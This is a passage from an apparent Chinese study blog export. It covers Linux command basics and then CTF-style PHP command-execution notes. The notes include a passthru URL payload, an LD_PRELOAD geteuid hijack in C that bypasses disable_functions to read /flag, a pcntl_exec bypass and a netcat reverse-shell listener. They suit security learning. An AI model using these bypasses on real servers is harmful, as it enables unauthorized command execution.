class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h3 id="find（按文件名查找文件）"><a href="#find（按文件名查找文件）" class="headerlink" title="find（按文件名查找文件）"></a>find（按文件名查找文件）</h3><p>在Linux系统中，可以通过find命令去搜索指定的文件</p><p>语法：<code>find 起始路径 -name &quot;被查找文件名&quot;</code></p><p>-name表示以文件名搜索</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;test&quot;</span><br></code></pre></td></tr></table></figure><h4 id="find命令-通配符"><a href="#find命令-通配符" class="headerlink" title="find命令-通配符"></a>find命令-通配符</h4><p>被查找文件名，支持使用通配符*来做模糊匹配</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;test*&quot;</span><br><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*test&quot;</span><br><span class="hljs-built_in">find</span> / -name <span class="hljs-string">&quot;*test*&quot;</span><br></code></pre></td></tr></table></figure><h4 id="find命令-按文件大小查找文件"><a href="#find命令-按文件大小查找文件" class="headerlink" title="find命令-按文件大小查找文件"></a>find命令-按文件大小查找文件</h4><p>语法：find 起始路径 -size +|- n [kMG]</p><ul><li>+、-表示大于和小于</li><li>n表示大小数字</li><li>KMG表示大小单位，k（小写字母）表示kb，M表示MB，G表示GB</li></ul><p>示例：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino">查找小于<span class="hljs-number">10</span>KB的文件：find / -size <span class="hljs-number">-10</span>k<br>查找大于<span class="hljs-number">100</span>MB的文件：find / -size <span class="hljs-number">+100</span>M<br>查找大于<span class="hljs-number">1</span>GB的文件：find / -size <span class="hljs-number">+1</span>G<br></code></pre></td></tr></table></figure><h2 id="grep、wc和管道符"><a href="#grep、wc和管道符" class="headerlink" title="grep、wc和管道符"></a>grep、wc和管道符</h2><h3 id="grep命令（过滤文件内容）"><a href="#grep命令（过滤文件内容）" class="headerlink" title="grep命令（过滤文件内容）"></a>grep命令（过滤文件内容）</h3><p><strong>可以通过grep命令，从文件中通过关键字过滤文件行。</strong></p><p><strong>语法：<code>grep [-n] 关键字 文件路径</code></strong></p><ul><li><strong>选项-n，可选，表示在结果中显示匹配的行的行号</strong></li><li><strong>参数，关键字，必填，表示过滤的关键字，带有空格或其他特殊符号，建议使用” “将关键字包围起来</strong></li><li><strong>参数，文件路径，必填，表示要过滤的内容的文件路径，可作为内容输入端口</strong></li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">grep <span class="hljs-string">&quot;itheima&quot;</span> <span class="hljs-keyword">test</span>.txt<br></code></pre></td></tr></table></figure><h3 id="wc命令（做数量统计）"><a href="#wc命令（做数量统计）" class="headerlink" title="wc命令（做数量统计）"></a>wc命令（做数量统计）</h3><p><strong>可以通过wc命令统计文件的行数、单词数量等</strong></p><p><strong>语法：<code>wc [-c -m -l -w] 文件路径</code></strong></p><ul><li><strong>选项，-c，统计bytes数量</strong></li><li><strong>选项，-m，统计字符数量</strong></li><li><strong>选项，-l，统计行数</strong></li><li><strong>选项，-w，统计单词数量</strong></li><li><strong>参数，文件路径，被统计的文件，可作为内容输入端口</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">wc</span> test.txt<br></code></pre></td></tr></table></figure><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p><strong>管道符：|</strong></p><p><strong>管道符的含义是：将管道符左边命令的结果，作为右边命令的输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> test.txt | grep itheima<br><span class="hljs-built_in">cat</span> test.txt | <span class="hljs-built_in">wc</span> -l<br><span class="hljs-built_in">ls</span> | grep <span class="hljs-built_in">test</span><br><span class="hljs-built_in">ls</span> /usr/bin | grep gtf<br><span class="hljs-built_in">ls</span> -l /usr/bin | grep gtf<br><span class="hljs-built_in">ls</span> -l /usr/bin | <span class="hljs-built_in">wc</span> -l<br></code></pre></td></tr></table></figure><h2 id="echo、tail和重定向符"><a href="#echo、tail和重定向符" class="headerlink" title="echo、tail和重定向符"></a>echo、tail和重定向符</h2><h3 id="echo命令（输出内容）"><a href="#echo命令（输出内容）" class="headerlink" title="echo命令（输出内容）"></a>echo命令（输出内容）</h3><p><strong>可以使用echo命令在命令行内输出指定内容</strong></p><p><strong>语法：<code>echo 输出的内容</code></strong></p><ul><li><strong>无需选项，只有一个参数，表示要输出的内容，复杂内容可以用” “包围</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello linux&quot;</span><br></code></pre></td></tr></table></figure><h3 id="反引号-（将字符当做命令执行）"><a href="#反引号-（将字符当做命令执行）" class="headerlink" title="反引号&#96;（将字符当做命令执行）"></a>反引号&#96;（将字符当做命令执行）</h3><p><strong>我们可以通过将命令用反引号`将其包围，被`包围的内容，会被作为命令执行，而非普通字符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-built_in">pwd</span>会输出<span class="hljs-built_in">pwd</span>因为这里不会将<span class="hljs-built_in">pwd</span>当做命令执行，而是普通字符<br><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>`<br></code></pre></td></tr></table></figure><h3 id="重定向符（写入和追加内容到文件）"><a href="#重定向符（写入和追加内容到文件）" class="headerlink" title="重定向符（写入和追加内容到文件）"></a>重定向符（写入和追加内容到文件）</h3><p><strong>重定向符：&gt;和&gt;&gt;</strong></p><ul><li><strong>&gt;,将左侧命令的结果，覆盖写入到符号右侧指定的文件中</strong></li><li><strong>&gt;&gt;，将左侧命令的结果，追加写入到符号右侧指定的文件中</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello Linux&quot;</span> &gt; itheima.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello itheima&quot;</span> &gt; itheima.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Hello itcast&quot;</span> &gt;&gt; itheima.txt<br></code></pre></td></tr></table></figure><h3 id="tail命令（查看文件尾部内容）"><a href="#tail命令（查看文件尾部内容）" class="headerlink" title="tail命令（查看文件尾部内容）"></a>tail命令（查看文件尾部内容）</h3><p>使用tail命令，可以查看文件尾部内容，跟踪文件的最新更改，语法如下：</p><p><strong><code>tail [-f -num] Linux路径</code></strong></p><ul><li>参数，Linux路径，表示被跟踪的文件路径</li><li>选项，-f，表示持续跟踪（跟踪文件更改）</li><li>选项，-num，表示查看尾部多少行，不填默认10行</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tail</span> test.txt<br><span class="hljs-built_in">tail</span> -5 test.txt<br><span class="hljs-built_in">tail</span> -20 test.txt<br></code></pre></td></tr></table></figure><h2 id="vi编辑器"><a href="#vi编辑器" class="headerlink" title="vi编辑器"></a>vi编辑器</h2><h3 id="vi-vim编辑器介绍："><a href="#vi-vim编辑器介绍：" class="headerlink" title="vi\vim编辑器介绍："></a>vi\vim编辑器介绍：</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-5.png"></p><h3 id="vi-vim编辑器的三种工作模式"><a href="#vi-vim编辑器的三种工作模式" class="headerlink" title="vi\vim编辑器的三种工作模式"></a>vi\vim编辑器的三种工作模式</h3><p><strong>命令模式：</strong></p><p>​<strong>命令模式下，所敲的按键编辑器都理解为命令，以命令驱动执行不同的功能</strong></p><p>​<strong>此模式下，不能自由进行文本编辑</strong></p><p><strong>输入模式：</strong></p><p>​<strong>也就是所谓的编辑模式、插入模式。</strong></p><p>​<strong>此模式下，可以对文件内容进行自由编辑</strong></p><p><strong>底线命令模式</strong></p><p>​<strong>以：开始，通常用于文件的保存、退出</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-6.png"></p><h3 id="命令模式快捷键"><a href="#命令模式快捷键" class="headerlink" title="命令模式快捷键"></a>命令模式快捷键</h3><p>命令模式下常见快捷键</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-7.png"></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-8.png"></p><h3 id="底线命令模式"><a href="#底线命令模式" class="headerlink" title="底线命令模式"></a>底线命令模式</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-9.png"></p><h1 id="Linux用户和权限"><a href="#Linux用户和权限" class="headerlink" title="Linux用户和权限"></a>Linux用户和权限</h1><h2 id="Linux的root用户"><a href="#Linux的root用户" class="headerlink" title="Linux的root用户"></a>Linux的root用户</h2><p><strong>root用户（超级管理员）</strong></p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-10.png"></p><p>root用户拥有最大的系统操作权限，而普通用户在许多地方的权限是受限的。</p><p>例如：使用普通用户无法在根目录下创建文件，root用户可以</p><ul><li>普通用户的权限，一般在其HOME目录内是不受限的、</li><li>一旦出了HOME目录，大多数地方，普通用户仅有只读和执行权限，无修改权限</li></ul><h3 id="su和exit命令（切换用户）"><a href="#su和exit命令（切换用户）" class="headerlink" title="su和exit命令（切换用户）"></a>su和exit命令（切换用户）</h3><p>su命令就是用于账户切换的系统命令，su：Switch User</p><p><strong>语法：<code>su [-] [用户名]</code></strong></p><ul><li>-符号是可选的，表示是否在切换用户后加载环境变量（建议带上）</li><li>参数：用户名，表示要切换的用户，用户名可以省略，省略表示切换到root</li><li>切换用户后，可以通过exit命令退回上一个用户，也可以使用快捷键：ctrl+d</li></ul><p>使用普通用户，切换到其他用户需要输入密码，如切换到root用户</p><p>使用root用户切换到其他用户，无需密码，可以直接切换</p><h3 id="sudo命令（临时获得root权限执行命令）"><a href="#sudo命令（临时获得root权限执行命令）" class="headerlink" title="sudo命令（临时获得root权限执行命令）"></a>sudo命令（临时获得root权限执行命令）</h3><p>可以使用sudo命令，为普通的命令授权，临时以root身份执行</p><p><strong>语法：<code>sudo 其他命令</code></strong></p><ul><li>在其他命令之前，带上sudo，即可为这一条命令临时赋予root授权</li><li>但是并不是所有的用户，都有权利使用sudo，我们需要为普通用户配置sudo认证</li></ul><p>配置sudo认证</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-11.png"></p><h2 id="用户、用户组管理"><a href="#用户、用户组管理" class="headerlink" title="用户、用户组管理"></a>用户、用户组管理</h2><h3 id="用户、用户组"><a href="#用户、用户组" class="headerlink" title="用户、用户组"></a>用户、用户组</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-12.png"></p><h3 id="用户组管理"><a href="#用户组管理" class="headerlink" title="用户组管理"></a>用户组管理</h3><p><strong>以下命令需root用户执行</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs">创建用户组<br>groupadd 用户组名<br><br>删除用户组<br>groupdel 用户组名<br></code></pre></td></tr></table></figure><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><p>以下命令需root用户执行</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs css">创建用户<br>useradd <span class="hljs-selector-attr">[-g -d]</span> 用户名<br>选项：-<span class="hljs-selector-tag">g</span>指定用户的组，不指定-<span class="hljs-selector-tag">g</span>，会创建同名组并自动加入，指定-<span class="hljs-selector-tag">g</span>需要组已经存在，如已存在同名组，必需使用-<span class="hljs-selector-tag">g</span><br>选项：-d指定用户HOME路径，不指定，HOME目录默认在：/home/用户名<br><br>删除用户<br>userdel <span class="hljs-selector-attr">[-r]</span> 用户名<br>选项：-<span class="hljs-attribute">r</span>，删除用户的HOME目录，不使用-<span class="hljs-attribute">r</span>，删除用户时，HOME目录保留<br><br>查看用户所属组<br>id <span class="hljs-selector-attr">[用户名]</span><br>参数：用户名，被查看的用户，如果不提供则查看自身<br><br>修改用户所属组<br>usermod -aG 用户组 用户名<br>将指定用户加入指定的用户组<br></code></pre></td></tr></table></figure><h3 id="getent（查看当前系统中有哪些用户）"><a href="#getent（查看当前系统中有哪些用户）" class="headerlink" title="getent（查看当前系统中有哪些用户）"></a>getent（查看当前系统中有哪些用户）</h3><p><strong>使用getent命令，可以查看当前系统中有哪些用户</strong></p><p><strong>语法：<code>getent passwd</code></strong></p><p>共有7份信息，分别是：</p><p>用户名：密码（x）：用户ID：组ID：描述信息（无用）：HOME目录：执行终端（默认bash）</p><p><strong>使用getent命令，同样可以查看当前系统中有哪些用户组</strong></p><p><strong>语法：<code>getent group</code></strong></p><p>包含3份信息：</p><p>组名称：组认证（显示为x）：组ID</p><h2 id="查看权限控制"><a href="#查看权限控制" class="headerlink" title="查看权限控制"></a>查看权限控制</h2><h3 id="认知权限信息"><a href="#认知权限信息" class="headerlink" title="认知权限信息"></a>认知权限信息</h3><p>通过ls -l可以以列表形式查看内容，并显示权限细节</p><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-13.png"></p><p><strong>权限细节：</strong><br><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-14.png"></p><p><strong>rwx</strong></p><ul><li>r表示读权限</li><li>w表示写权限</li><li>x表示执行权限</li></ul><p><strong>针对文件、文件夹的不同，rwx的含义有细微差别</strong></p><p>r，针对文件可以查看文件内容</p><p>​针对文件夹，可以查看文件夹内容，如ls命令</p><p>w，针对文件表示可以修改此文件</p><p>​针对文件夹，可以在文件夹内：创建、删除、改名等操作</p><p>x，针对文件表示可以将文件作为程序执行</p><p>​针对文件夹，表示可以更改工作目录到此文件夹，即cd进入</p><h2 id="修改权限控制-chmod"><a href="#修改权限控制-chmod" class="headerlink" title="修改权限控制 - chmod"></a>修改权限控制 - chmod</h2><h3 id="chmod命令"><a href="#chmod命令" class="headerlink" title="chmod命令"></a>chmod命令</h3><p>我们可以使用chmod命令，修改文件、文件夹的权限信息。</p><p><strong>注意：只有文件、文件夹的所属用户或root用户可以修改</strong></p><p><strong>语法：<code>chmod [-R] 权限 文件或文件夹</code></strong></p><p><strong>选项：-R，对文件夹内的全部内容应用同样的操作</strong></p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gml">chmod u=rwx,g=rx,o=<span class="hljs-variable language_">x</span> hello.txt，将文件权限修改为：rwxr-<span class="hljs-variable language_">x</span>--<span class="hljs-variable language_">x</span><br>其中：u表示user所属用户权限，g表示group组权限，o表示<span class="hljs-symbol">other</span>其他用户权限<br><br>chmod -R u=rwx,g=rx,o=<span class="hljs-variable language_">x</span> test，将文件夹test以及文件夹内全部内容权限设置为：rwxr-<span class="hljs-variable language_">x</span>--<span class="hljs-variable language_">x</span><br></code></pre></td></tr></table></figure><h3 id="权限的数字序号"><a href="#权限的数字序号" class="headerlink" title="权限的数字序号"></a>权限的数字序号</h3><p><img src="/../image/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4-15.png"></p><h2 id="修改权限控制-chown"><a href="#修改权限控制-chown" class="headerlink" title="修改权限控制 - chown"></a>修改权限控制 - chown</h2><h3 id="chown命令"><a href="#chown命令" class="headerlink" title="chown命令"></a>chown命令</h3><p>使用chown命令，可以修改文件、文件夹的所属用户和用户组</p><p><strong>注意：普通用户无法修改所属为其它用户或组，所以此命令只适用于root用户执行</strong></p><p><strong>语法：<code>chown [-R] [用户] [:] [用户组] 文件或文件夹</code></strong></p><ul><li><strong>选项，-R，同chmod，对文件夹内全部内容应用相同规则</strong></li><li><strong>选项，用户，修改所属用户</strong></li><li><strong>选项，用户组，修改所属用户组</strong></li><li><strong>:用于分隔用户和用户组</strong></li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xquery">chown<span class="hljs-built_in"> root</span> hello.txt，将hello.txt所属用户修改<span class="hljs-built_in">为root</span><br>chown :root hello.txt，将hello.txt所属用户组修改<span class="hljs-built_in">为root</span><br>chown<span class="hljs-built_in"> root</span>:itheima hello.txt，将hello.txt所属用户修改<span class="hljs-built_in">为root</span>，所属组修改为itheima<br>chown -R<span class="hljs-built_in"> root</span> test，将文件夹test的所属用于修改<span class="hljs-built_in">为root</span>并对文件夹内全部内容应用同样规则<br></code></pre></td></tr></table></figure><h1 id="Linux实用操作"><a href="#Linux实用操作" class="headerlink" title="Linux实用操作"></a>Linux实用操作</h1><h2 id="各类小技巧（快捷键）"><a href="#各类小技巧（快捷键）" class="headerlink" title="各类小技巧（快捷键）"></a>各类小技巧（快捷键）</h2><p>常用快捷键</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css">ctrl + c强制停止<br>ctrl + d退出或登出<br><br>历史命令搜索<br>history查看历史输入过的命令<br>!自动执行上一次匹配前缀的命令<br>ctrl + <span class="hljs-attribute">r</span>输入内容去匹配历史命令回车执行，键盘左右键得到此命令但不执行<br><br>光标移动快捷键<br>ctrl + <span class="hljs-selector-tag">a</span>跳到命令开头<br>ctrl + e跳到命令结尾<br>ctrl + 键盘左键向左跳一个单词<br>ctrl + 键盘右键向右跳一个单词<br><br>清屏<br>ctrl + l清空终端内容<br><span class="hljs-attribute">clear</span>清屏<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p>system(string $command,int $return_var&#x3D;?)</p><p>常用参数：</p><p>command参数：执行command参数所指定的命令，并且输出执行结果</p><p>如果提供return_var参数，则外部命令执行后的返回状态将会被设置到此变量中</p><p>能够直接回显结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1.png"></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec(string $command,array &amp;$output&#x3D;?,int &amp;$return_var&#x3D;?)</p><p>command参数：要执行的命令。单独使用时只有最后一行结果，且不会回显（如果需要显示所有内容要定义一个数组），直接用echo只会回显最后一行</p><p>output参数：用命令执行的输出填充此数组，每行输出填充数组中的一个元素。即逐行填充数组。</p><p>需要借用print_r或者var_dump来输出结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2.png"></p><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru"></a>passthru</h3><p>passthru(string $command,int &amp;$return_var&#x3D;?)</p><p>command参数：要执行的命令</p><p>输出二进制数据，并且需要直接传送到浏览器。</p><p>直接回显结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-3.png"></p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p>shell_exec(string $cmd)</p><p>cmd参数：要执行的命令</p><p>环境执行命令，并且将完整的输出以字符串的方式返回。功能等同于反引号</p><p>借用echo、print等输出结果</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-4.png"></p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><p>反引号`要执行的命令`（反引号&#96;在键盘左上角~号下面）</p><p>反引号能够执行程序指令</p><p>不能直接回显，需要使用echo&#x2F;print来输出</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-5.png"></p><h3 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h3><p>popen(string $command,string $mode)</p><p>command参数：要执行的命令。</p><p>mode参数：模式。’r’表示读取，’w’表示写入。</p><p>fgets获取内容-&gt;print_r输出内容</p><p>需要先fgets或者fread获取popen()的内容，然后再用echo或print_r输出</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-6.png"></p><h3 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h3><p>proc_open($command,$descriptor_spec,$pipes,$cwd,$env_vars,$options)</p><p>command参数：要执行的命令</p><p>descriptor_spec参数：定义数组内容</p><p>pipes参数：调用数组内容</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-7.png"></p><h3 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec"></a>pcntl_exec</h3><p>pcntl_exec(string $path,array $args&#x3D;?,array $envs&#x3D;?)</p><p>pathpath必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）</p><p>args是一个要传递给程序的参数的字符串数组</p><p>envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key&#x3D;&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p><strong>在当前进程空间执行指定程序</strong></p><h3 id="补充：assert和eval"><a href="#补充：assert和eval" class="headerlink" title="补充：assert和eval"></a>补充：assert和eval</h3><p>eval定义和用法：<br>1.eval会把字符串当作PHP代码来执行<br>2.eval语法非常严格，所有的要执行的php字符串都必须完整，且以分号结尾<br>3.如果字符串中带有return，会立刻终止执行并返回NULL<br>4.如果代码中存在解析错误，则 eval() 函数返回 false</p><p>assert的定义与用法：<br>1.assert会把字符串当作PHP代码来执行<br>2.assert被认定为一个可变函数</p><p>详细说明：<a href="https://blog.csdn.net/senng/article/details/125961095">https://blog.csdn.net/senng/article/details/125961095</a></p><h2 id="替换绕过函数绕过"><a href="#替换绕过函数绕过" class="headerlink" title="替换绕过函数绕过"></a>替换绕过函数绕过</h2><p>其实就是一个例题</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-8.png"></p><p>发现没有过滤passthru，直接构造payload</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;ls&#x27;</span>)查看目录</span><br>或者<br>?<span class="hljs-keyword">cmd</span><span class="language-bash">=passthru(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>)然后查看源码就能看到flag.php文件内容</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-9.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-10.png"></p><h2 id="LD-PRELOAD绕过"><a href="#LD-PRELOAD绕过" class="headerlink" title="LD_PRELOAD绕过"></a>LD_PRELOAD绕过</h2><p>使用场景：disable_functions禁用所有肯用到命令执行的函数</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-11.png"></p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-12.png"></p><h2 id="mail-函数命令执行"><a href="#mail-函数命令执行" class="headerlink" title="mail()函数命令执行"></a>mail()函数命令执行</h2><p>绕过条件：</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-13.png"></p><p><strong>构造payload</strong></p><p>mail函数——调用子程序“&#x2F;user&#x2F;sbin&#x2F;sendmail”——调用动态链接库geteuid函数</p><p>给geteuid函数重新赋值</p><p>demo2.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag &gt; /tmp/flag&quot;</span>);读取flag输出到/tmp/flag<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">geteuid</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">payload</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-14.png"></p><p>EVIL_CMDLINE</p><p>执行其他命令时需要修改demo2.so里的geteuid函数</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-15.png"></p><p>这个听不懂一点</p><h2 id="蚁剑及pcntl绕过函数过滤"><a href="#蚁剑及pcntl绕过函数过滤" class="headerlink" title="蚁剑及pcntl绕过函数过滤"></a>蚁剑及pcntl绕过函数过滤</h2><h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>使用蚁剑绕过</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-16.png"></p><h3 id="pcntl-exec函数"><a href="#pcntl-exec函数" class="headerlink" title="pcntl_exec函数"></a>pcntl_exec函数</h3><p>需单独加载组件</p><p>pcntl_exec(string $path,array $args&#x3D;?,array $envs&#x3D;?)</p><p>参数path：必须时可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径标头的脚本（比如文件第一行是#!&#x2F;user&#x2F;local&#x2F;bin&#x2F;perl的perl脚本）</p><p>参数：args是一个要传递给程序的参数的字符串数组</p><p>参数：envs是一个要传递给程序作为环境变量的字符串数组。这个数组是key&#x3D;&gt;value格式的，key代表要传递的环境变量的名称，value代表该环境变量值</p><p>在当前进程空间执行指定程序</p><p>#ls</p><p>#&#x2F;bin&#x2F;bash -c &#x2F;bin&#x2F;ls完整命令</p><p>path:&#x2F;bin&#x2F;bash  </p><p>args:-c&#x2F;bin&#x2F;ls</p><hr><p>info信息：没有禁用pcntl_exec函数‘</p><p>pcntl_exec函数没有回显</p><p>解决方法一：cat文件并输出到有权限读取路径；</p><p>解决方法二：shell反弹</p><p><img src="/../image/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-17.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> -lvp <span class="hljs-number">7777</span>监听命令<br>这里的<span class="hljs-built_in">ip</span>为kali的<span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><h3 id><a href="#" class="headerlink" title=";"></a>;</h3><p>使多个命令按顺序执行</p><p>前面的命令和后面的命令都会执行</p><p>如果前面的命令出错不影响后面的命令执行</p><figure class="highlight 